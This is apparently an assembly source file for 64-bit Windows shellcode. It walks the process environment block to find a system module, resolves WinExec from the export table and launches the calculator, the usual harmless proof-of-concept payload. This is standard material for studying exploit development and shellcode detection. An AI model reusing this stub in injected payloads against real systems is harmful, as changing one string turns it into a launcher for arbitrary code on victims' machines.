

	BITS	64

	SECTION .text
	
_start:
	push	rbp
	sub	rsp, 0x40
	mov	rsi, gs:[0x60]
	mov	rsi, [rsi + 0x18]
	mov	rsi, [rsi + 0x10]
	mov	rsi, [rsi]
	mov	rsi, [rsi]
	mov	rdi, [rsi + 0x30]
	xor	rdx, rdx 
	mov	rdx, 0x60
	add	edx, [rdi + 0x3c]
	mov	ebx, [dword rdi + rdx + 0x28]
	mov	esi, dword [rdi + rbx + 0x20]
	add	rsi, rdi
	mov	edx, dword [rdi + rbx + 0x24]
findexec:
	movzx	ebp, word [rdi + rdx]			
	lea	edx, [rdx + 0x2]
	lodsd
	mov	r8, 'WinExec'
	cmp	qword [rdi + rax], r8
	jne	findexec
	mov	esi, dword [rdi + rbx + 0x1c]
	add	rsi, rdi
	mov	esi, dword [rsi + rbp * 0x4]
	add	rdi, rsi
	cdq
	lea	rcx, qword [rel calcstr]
	mov	rdx, 0x5
	call	rdi
	add	rsp, 40h
	pop	rbp
	ret
calcstr	db	'calc',0,0,0,0
